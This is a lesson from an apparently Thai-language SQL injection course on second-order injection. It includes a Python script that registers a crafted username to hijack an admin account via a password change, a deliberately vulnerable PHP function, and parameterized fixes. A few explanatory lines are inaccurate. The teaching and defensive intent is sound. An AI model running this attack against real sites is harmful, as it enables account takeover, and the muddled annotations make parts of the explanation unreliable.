# Part 079: Advanced Second-Order SQL Injection

## ภาพรวม

Second-order สูงขึ้น: ช่องหว่งที่เกิดทีหลังจากเก็บข้อมูล

**ขั้นตอนที่ 1256-1270**

---

## 1256. Second-Order สะสม

```
First-order: payload -> query ในครั้งเดียวกัน
Second-order: payload ถูกเก็บ -> เดิน query ทีหลัง

Scenario:
1. User สมัคร username = admin'-- -
   -> app sanitize ก่อน INSERT (escape แล้ว)
   -> เก็บใน DB เป็น admin'-- - (แค่ unescape แล้ว)

2. Admin แก้ไข password
   -> ดึง username จาก DB: SELECT username WHERE id=X
   -> ได้ admin'-- - (raw)
   -> UPDATE users SET pass='new' WHERE username='admin'-- -'
   -> Comment ตัด 'new' ส่วนท้าย
   -> UPDATE users SET pass='new' WHERE username='admin'
   -> admin password ถูกเปลี่ยน!
```

---

## 1257. Attack Scenario

```python
import requests

BASE_URL = 'http://target.com'

def second_order_attack():
    # Step 1: Register with malicious username
    malicious_username = "admin'-- -"
    requests.post(f'{BASE_URL}/register', data={
        'username': malicious_username,
        'password': 'attacker123',
        'email': 'attacker@evil.com'
    })
    print(f"[1] Registered as: {malicious_username}")
    
    # Step 2: Login ด้วย account ใหม่
    r = requests.post(f'{BASE_URL}/login', data={
        'username': malicious_username,
        'password': 'attacker123'
    })
    session_cookie = r.cookies.get('session')
    print(f"[2] Logged in, session: {session_cookie[:20]}...")
    
    # Step 3: เปลี่ยน password (trigger second-order)
    # ถ้า app ใช้ username จาก DB แบบ unsafe ใน UPDATE query
    new_pass = 'compromised'
    requests.post(
        f'{BASE_URL}/change-password',
        data={'new_password': new_pass, 'confirm': new_pass},
        cookies={'session': session_cookie}
    )
    print(f"[3] Changed password to: {new_pass}")
    
    # Step 4: Login เป็น admin
    r = requests.post(f'{BASE_URL}/login', data={
        'username': 'admin',
        'password': new_pass
    })
    if 'Welcome, admin' in r.text or 'dashboard' in r.text.lower():
        print("[+] SUCCESS! Admin account compromised!")
    else:
        print("[-] Failed")

# second_order_attack()
```

---

## 1258. ฟังก์ชันที่ Vulnerable

```php
// Change password ที่ vulnerable:
function changePassword($new_pass) {
    $session_user_id = $_SESSION['user_id'];
    
    // ดึง username จาก DB (ยัง sanitize)
    $user = $db->query("SELECT username FROM users WHERE id = $session_user_id");
    $username = $user[0]['username'];  // admin'-- -
    
    // UPDATE โดยใช้ username แบบ raw!
    // UPDATE users SET password='hash' WHERE username='admin'-- -'
    $hash = password_hash($new_pass, PASSWORD_BCRYPT);
    $db->query("UPDATE users SET password='$hash' WHERE username='$username'");
    // ^^ second-order injection!
}

// แก้ไข:
function safeChangePassword($new_pass) {
    $session_user_id = $_SESSION['user_id'];
    // ใช้ user_id แทน username
    $hash = password_hash($new_pass, PASSWORD_BCRYPT);
    $stmt = $pdo->prepare("UPDATE users SET password = ? WHERE id = ?");
    $stmt->execute([$hash, $session_user_id]);
}
```

---

## 1259. Prevention

```python
# Principle: ใช้ primary key (id) แทน user-controlled values
# เสมอ treat data จาก DB เหมือน untrusted input

import mysql.connector

def safe_change_password(user_id: int, new_password: str, hashed: str):
    conn = mysql.connector.connect(host='localhost', database='app',
                                   user='user', password='pass')
    cursor = conn.cursor()
    
    # SECURE: ใช้ user_id (ไม่ใช่ username)
    cursor.execute(
        "UPDATE users SET password = %s WHERE id = %s",
        (hashed, user_id)  # id ไม่สามารถ inject ได้ (int)
    )
    conn.commit()
    conn.close()

# หลักการ:
# 1. ใช้ id (หรือ primary key) เสมอ ไม่ใช้ string values
# 2. Treat DB data เหมือน untrusted
# 3. Parameterized queries ทุก query
# 4. ท๊า test second-order เป็นส่วนหนึ่งของ pentest
```

---

## สรุป

Advanced Second-Order SQLi:
- **Scenario** - register malicious username, trigger later
- **Change-password** - classic second-order vector
- **Root cause** - using string values from DB in queries
- **Fix** - use integer IDs, parameterize everything

---

*Part 079 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
